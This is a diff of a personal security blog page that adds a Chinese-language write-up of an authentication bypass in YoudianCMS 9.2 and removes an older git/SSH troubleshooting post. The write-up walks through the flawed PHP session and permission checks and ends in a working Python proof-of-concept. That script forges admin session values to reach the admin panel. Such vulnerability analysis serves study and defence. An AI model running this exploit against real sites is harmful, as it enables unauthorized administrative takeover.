@@ -55,6 +55,79 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
+    <article id="post-9-2后台登录绕过" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/06/28/9-2后台登录绕过/">youdiancms9.2后台登录绕过&#39;</a>
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2021/06/28/9-2后台登录绕过/" class="article-date">
+  <time datetime="2021-06-28T12:08:20.000Z" itemprop="datePublished">2021-06-28</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
+  </div>
+
+    
+  </div>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <ul>
+<li>buildImageVerify里可设置session</li>
+<li>AdminGroupiD=1即为超级管理员</li>
+</ul>
+<h3 id="检查后台是否登录，并鉴权"><a href="#检查后台是否登录，并鉴权" class="headerlink" title="检查后台是否登录，并鉴权"></a>检查后台是否登录，并鉴权</h3><p>App\Lib\Action\AdminBaseAction.class.php</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_initialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$mName = strtolower(ACTION_NAME);</span><br><span class="line">		$NoCheckAction = <span class="keyword">array</span>(<span class="string">'login'</span>, <span class="string">'verify'</span>,<span class="string">'checklogin'</span>,<span class="string">'showcode'</span>,<span class="string">'logout'</span>); <span class="comment">//免登录验证模块</span></span><br><span class="line">		<span class="keyword">if</span>( !<span class="keyword">$this</span>-&gt;isLogin() &amp;&amp; !in_array($mName, $NoCheckAction))&#123; <span class="comment">//没有登录，将返回登录页面</span></span><br><span class="line">		    <span class="keyword">$this</span>-&gt;_checkAjaxRequest();</span><br><span class="line">			<span class="keyword">$this</span>-&gt;redirect(<span class="string">"Public/login"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>( !<span class="keyword">$this</span>-&gt;checkPurview() )&#123; <span class="comment">//没有登录，将返回网站首页</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;redirect(<span class="string">"Public/welcome"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>跟进isLogin和checkPurview</p>
+<p>isLogin很简单，就只是检查了是否有?AdminID和?AdminIDName</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLogin</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$b = session(<span class="string">"?AdminID"</span>) &amp;&amp; session(<span class="string">"?AdminName"</span>);</span><br><span class="line">	<span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>checkPurview,这里检查$gid是否为1来鉴权。根据php的弱类型，只要上面的那个md5值的字符串第一位为1即可return true</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php弱类型</span><br><span class="line">var_dump(<span class="string">'1test'</span>==<span class="number">1</span>) <span class="comment">//true</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPurview</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$gid = session(<span class="string">'AdminGroupID'</span>);</span><br><span class="line">		<span class="keyword">if</span>( $gid == <span class="number">1</span> ) <span class="keyword">return</span> <span class="keyword">true</span>;  <span class="comment">//超级管理员拥有所有权限</span></span><br><span class="line">	...</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="控制session"><a href="#控制session" class="headerlink" title="控制session"></a>控制session</h3><p>BaseAction.class.php中</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyCode</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$length = $_GET[<span class="string">'length'</span>];        <span class="comment">//长度</span></span><br><span class="line">	$mode = $_GET[<span class="string">'mode'</span>];          <span class="comment">//模式</span></span><br><span class="line">	$type = $_GET[<span class="string">'type'</span>];              <span class="comment">//图像类型</span></span><br><span class="line">	$width = $_GET[<span class="string">'width'</span>];           <span class="comment">//宽度</span></span><br><span class="line">	$height = $_GET[<span class="string">'height'</span>];        <span class="comment">//高度</span></span><br><span class="line">	$verifyName = $_GET[<span class="string">'verify'</span>];  <span class="comment">//验证码session名称</span></span><br><span class="line">	import(<span class="string">"ORG.Util.Image"</span>);</span><br><span class="line">	Image::buildImageVerify($length, $mode, $type, $width, $height, $verifyName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>跟进buildImageVerify中</p>
+<p>$verifyName可控，该session的值是randString产生的随机字符的md5，而randString($length, $mode)中的参数也是可控的，跟进randString看看</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">buildImageVerify</span><span class="params">($length=<span class="number">4</span>, $mode=<span class="number">1</span>, $type=<span class="string">'png'</span>, $width=<span class="number">48</span>, $height=<span class="number">22</span>, $verifyName=<span class="string">'verify'</span>)</span> </span>&#123;</span><br><span class="line">        import(<span class="string">'ORG.Util.StringEx'</span>);</span><br><span class="line">        $randval = StringEx::randString($length, $mode);</span><br><span class="line">        $_SESSION[$verifyName] = md5($randval);</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>App\Core\Extend\Library\ORG\Util\StringEx.class.php</p>
+<p>为了让session进一步可控，将len设置为2，type为1，这些参数都是前面verifyCode中可控的</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">randString</span><span class="params">($len=<span class="number">6</span>,$type=<span class="string">''</span>,$addChars=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	$str =<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">switch</span>($type) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">			$chars=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			$chars= str_repeat(<span class="string">'0123456789'</span>,<span class="number">3</span>);</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">			;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			$chars=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			$chars=<span class="string">'abcdefghijklmnopqrstuvwxyz'</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			$chars = <span class="string">"们以我..."</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span> :</span><br><span class="line">			<span class="comment">// 默认去掉了容易混淆的字符oOLl和数字01，要添加请使用addChars参数</span></span><br><span class="line">			$chars=<span class="string">'ABCDEFGHIJKMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789'</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($len&gt;<span class="number">10</span> ) &#123;<span class="comment">//位数过长重复字符串一定次数</span></span><br><span class="line">		$chars= $type==<span class="number">1</span>? str_repeat($chars,$len) : str_repeat($chars,<span class="number">5</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($type!=<span class="number">4</span>) &#123;</span><br><span class="line">		$chars   =   str_shuffle($chars);</span><br><span class="line">		$str     =   substr($chars,<span class="number">0</span>,$len);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// 中文随机字</span></span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$len;$i++)&#123;</span><br><span class="line">		  $str.= <span class="keyword">self</span>::msubstr($chars, floor(mt_rand(<span class="number">0</span>,mb_strlen($chars,<span class="string">'utf-8'</span>)<span class="number">-1</span>)),<span class="number">1</span>,<span class="string">'utf-8'</span>,<span class="keyword">false</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>爆破100以内，md5值的第一位为1，第二位不为数字的数</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	md5=hashlib.md5()</span><br><span class="line">	md5.update(str(a).encode(<span class="string">"utf8"</span>))</span><br><span class="line">	end=md5.hexdigest()</span><br><span class="line">	<span class="keyword">if</span> end.startswith(<span class="string">'1'</span>) <span class="keyword">and</span> <span class="keyword">not</span> end[<span class="number">1</span>].isdigit():</span><br><span class="line">		print(<span class="string">'-------------&gt;'</span>,a)</span><br><span class="line">	a=int(a)+<span class="number">1</span></span><br><span class="line">	print(end)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="number">100</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/images/Article_images/image-20210628165929330.png" alt="image-20210628165929330"></p>
+<p>POC</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Session</span><span class="params">(req,domain)</span>:</span></span><br><span class="line">    URL = domain + <span class="string">'/index.php/base?a=verifycode&amp;verify='</span></span><br><span class="line">    AdminURL = domain + <span class="string">'/index.php/Admin/Public/AdminLeft/MenuTopID/7'</span></span><br><span class="line">    payload_one = <span class="string">'AdminID'</span></span><br><span class="line">    payload_two = <span class="string">'AdminName'</span></span><br><span class="line">    payload_three = <span class="string">'AdminGroupID&amp;mode=1&amp;length=2'</span></span><br><span class="line">    res_one = req.get(URL + payload_one).headers</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'set-cookie'</span> <span class="keyword">in</span> res_one:</span><br><span class="line">        print(res_one[<span class="string">'set-cookie'</span>])</span><br><span class="line">    res_two = req.get(URL + payload_two).headers</span><br><span class="line">    res_three = req.get(URL + payload_three).headers</span><br><span class="line">    </span><br><span class="line">    res_admin = req.get(AdminURL)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'模板'</span> <span class="keyword">in</span> res_admin.text:</span><br><span class="line">        print(<span class="string">'OK'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    domain = <span class="string">'http://127.0.0.1'</span></span><br><span class="line">    banner(domain)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        req = requests.session()</span><br><span class="line">        <span class="keyword">if</span> Session(req,domain):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure></div>
+
+
+      
+    </div>
+    
+  </div>
+  
+  
+</article>
+
+  
     <article id="post-某个SpringBoot项目的审计" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
@@ -609,63 +682,6 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
 </article>
 
   
-    <article id="post-git-ssh连不上github问题" class="article global-container article-type-post" itemscope itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/04/git-ssh连不上github问题/">git ssh连不上github问题</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/10/04/git-ssh连不上github问题/" class="article-date">
-  <time datetime="2019-10-04T14:47:24.000Z" itemprop="datePublished">2019-10-04</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/杂记/">杂记</a>
-  </div>
-
-    
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-cloud" itemprop="articleBody">
-      
-        <p>开始的时候是可以连上的，后来不知道怎么的就不行了，，，网上找了好久终于解决了，，这里我整理了一下这些问题</p>
-<h1 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h1><ul>
-<li>ping不了github.com<br>到本地hosts文件中添加一条github记录，并且删除.ssh中的known_hosts文件<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.30.255.112 github.com git </span><br><span class="line">185.31.16.184 github.global.ssl.fastly.net</span><br></pre></td></tr></table></figure></div>
-
-</li>
-</ul>
-<p>然后本地ping通了github，，，遂解决了连接不上的问题</p>
-<h1 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h1><ul>
-<li>22端口被占用<br>在.ssh文件夹中添加一个config文件，内容为：<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure></div>
-
-</li>
-</ul>
-<h1 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h1><ul>
-<li>ssh key失效了<br>删除.ssh，重新进行配置<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;yournamne&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br><span class="line">将.ssh中id_rsa.pub中的内容复制到github中ssh and gpg keys</span><br></pre></td></tr></table></figure></div>
-
-</li>
-</ul>
-<p>然后尝试连接 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>，输入yes，，如果出现success，就代表连接成功</p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
 
 
   <nav id="page-nav">
@@ -724,6 +740,10 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
       <ul>
         
           <li>
+            <a href="/2021/06/28/9-2后台登录绕过/">youdiancms9.2后台登录绕过&#39;</a>
+          </li>
+        
+          <li>
             <a href="/2021/06/05/某个SpringBoot项目的审计/">某个SpringBoot项目的审计</a>
           </li>
         
@@ -737,10 +757,6 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
         
           <li>
             <a href="/2019/10/24/CVE-2019-11043-复现/">CVE-2019-11043 复现</a>
-          </li>
-        
-          <li>
-            <a href="/2019/10/23/WiFi网络结构/">WiFi网络结构</a>
           </li>
         
       </ul>
